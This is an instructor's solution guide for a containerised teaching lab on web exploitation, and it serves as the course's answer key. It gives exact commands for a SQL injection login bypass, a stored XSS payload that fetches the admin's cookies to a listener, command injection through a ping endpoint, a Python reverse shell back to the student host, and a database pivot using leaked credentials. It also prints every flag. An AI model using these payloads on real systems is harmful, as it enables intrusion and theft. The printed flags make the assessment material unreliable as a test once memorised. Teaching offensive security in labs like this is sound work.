# Week 4 Solution Guide: Web Application Exploitation - Part I

Step-by-step solution, exact commands, and walkthrough for instructors and
graders verifying **Week 4 Project**. All commands below are run from
inside `week4_student` unless noted otherwise.

```bash
podman-compose up -d --build
podman exec -it week4_student bash
```

---

## Flag 1 Solution (Easy) — SQL Injection Authentication Bypass

The login query is built as:
```python
query = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (u, p)
```

Bypass it with a classic tautology, commenting out the password check:
```bash
curl -s -c /tmp/c -X POST http://webapp/login \
  --data-urlencode "username=admin' OR '1'='1'--" \
  --data-urlencode "password=x"
curl -s -b /tmp/c http://webapp/dashboard
```
**Flag 1:** `flag{w4_1_sqli_auth_byp4ss_cl4ss1c}`

---

## Flag 2 Solution (Easy) — Backup File Disclosure

```bash
curl -s http://webapp/robots.txt
# User-agent: *
# Disallow: /backup/

curl -s http://webapp/backup/site-backup-2025-12-31.txt
```
The backup notes also mention a leftover `/opt/app/config/` file on the
`webapp` host related to a "reports integration" - a hint for Flag 5.

**Flag 2:** `flag{w4_2_b4ckup_f1l3_3xp0sur3}`

---

## Flag 3 Solution (Medium) — Stored XSS / Cookie Theft

1. Start a listener on the student container:
   ```bash
   python3 -m http.server 8000
   ```

2. In a second shell into `week4_student`, submit a comment with an XSS
   payload (must be URL-encoded, e.g. via `--data-urlencode`, or submitted
   through a real HTML form/browser - a raw `+` in the JS will get decoded
   to a space by the form parser otherwise):
   ```bash
   curl -s -X POST http://webapp/comments \
     --data-urlencode "author=attacker" \
     --data-urlencode "body=<img src=x onerror=\"fetch('http://172.30.0.5:8000/steal?c='+document.cookie)\">"
   ```

3. The admin bot (a real headless Chromium browser, `admin_bot.py`) logs
   into the portal and reviews `/comments` every ~15 seconds. When it does,
   your injected `<img onerror>` handler fires in its authenticated
   session and exfiltrates cookies to your listener:
   ```
   172.30.0.10 - - [.../steal?c=session_token=flag{w4_3_st0r3d_xss_c00k13_th3ft}] 404
   ```
   The 404 is expected - the flag is in the request line, no receiving
   endpoint is needed. Note the real Flask `session` cookie is `HttpOnly`
   and cannot be stolen this way; `session_token` is a deliberately
   non-HttpOnly secondary cookie.

**Flag 3:** `flag{w4_3_st0r3d_xss_c00k13_th3ft}`

---

## Flag 4 Solution (Medium) — Command Injection

The `/ping` tool runs `"ping -c 1 -W 2 " + host` via `subprocess.check_output(..., shell=True)`.

```bash
curl -s -X POST http://webapp/ping --data-urlencode "host=127.0.0.1; cat /opt/app/flag4.txt"
```

**Flag 4:** `flag{w4_4_p1ng_cmd_1nj3ct10n_rce}`

---

## Flag 5 Solution (Hard) — Pivot to internal-db

### Step 1: Get an interactive shell on webapp

Start a listener on `student`:
```bash
nc -lvnp 4444
```

In another shell into `week4_student`, trigger a reverse shell via the same
`/ping` injection point:
```bash
curl -s -X POST http://webapp/ping --data-urlencode \
  'host=127.0.0.1; python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"172.30.0.5\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"bash\")" &'
```
Your `nc` listener now has an interactive `root@webapp` shell.

### Step 2: Discover the leaked internal credentials

```bash
cat /opt/app/config/db_config.py
```
```python
INTERNAL_DB_HOST = "internal-db"
INTERNAL_DB_PORT = 3306
INTERNAL_DB_NAME = "internal"
INTERNAL_DB_USER = "svc_reports"
INTERNAL_DB_PASSWORD = "R3p0rt1ng!2026"
```

### Step 3: Confirm the second network / pivot point

```bash
ip a          # webapp has a second interface on 172.30.1.0/24
getent hosts internal-db
```
(`student` cannot resolve or reach `internal-db` at all - only `webapp` can.)

### Step 4: Connect to internal-db and read the flag

`webapp`'s image already has the MySQL/MariaDB client installed, so use the
target's own tooling from your shell:
```bash
mysql -h internal-db -u svc_reports -pR3p0rt1ng!2026 internal -e "SELECT * FROM flags;"
```

**Flag 5:** `flag{w4_5_p1v0t_1nt3rn4l_db_f00th0ld_3xp4nd}`

*Shortcut for grading:* the same result can be obtained without an
interactive shell by chaining a second injection through `/ping` directly:
```bash
curl -s -X POST http://webapp/ping --data-urlencode \
  'host=127.0.0.1; mysql -h internal-db -u svc_reports -pR3p0rt1ng!2026 internal -e "SELECT value FROM flags WHERE name='"'"'flag5'"'"';"'
```
Full interactive access is still the intended teaching path (foothold, then
expand), since it's what a real assessment would require to explore an
unfamiliar internal network.

---

## Network Segmentation Verification

Confirms the topology matches the assignment: `student` can reach `webapp`
only; `webapp` is dual-homed and can reach `internal-db`; `student` cannot
reach `internal-db` under any circumstance.
```bash
# from student - works
podman exec week4_student ping -c1 webapp

# from student - fails (no route / no DNS entry)
podman exec week4_student ping -c1 internal-db
podman exec week4_student nc -vz -w3 172.30.1.20 3306   # times out

# from webapp (after compromise) - works
podman exec week4_webapp mysql -h internal-db -u svc_reports -pR3p0rt1ng!2026 internal -e "SELECT 1;"
```

## Automated Verification Script

```bash
podman exec week4_student python3 /workspace/solve_week4.py
```
